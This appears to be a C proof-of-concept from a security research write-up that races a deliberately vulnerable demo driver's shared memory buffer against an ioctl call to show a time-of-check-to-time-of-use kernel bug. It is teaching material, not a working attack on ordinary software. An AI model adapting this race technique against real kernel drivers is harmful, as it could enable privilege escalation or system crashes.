// SPDX-License-Identifier: GPL-2.0

// Buggy code, DO NOT USE. See https://research.nccgroup.com/?p=18577

// PoC buggy driver shared memory TOCTOU

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>


#define u32 unsigned int

#define VULN_PROCESS_BUF _IO('v', 5)

#define LEN (0x1000)

int main(int argc, char **argv)
{
	int fd = open("/dev/vuln_shmem", O_RDWR);
	if (fd < 0) {
		perror("open error");
		return -1;
	}

	/* required to be 'volatile', otherwise access may be optimised out */
	volatile u32 *buf = mmap(NULL, LEN, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (buf == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	int child = fork() == 0;

	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(child, &set);
	if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
		perror("sched_setaffinity error");
		return -1;
	}

	if (child) {
		while (1) {
			buf[0] = 32;
			buf[0] = 128;
		}
	} else {
		while (1) {
			ioctl(fd, VULN_PROCESS_BUF, 0);
		}
	}

	return 0;
}
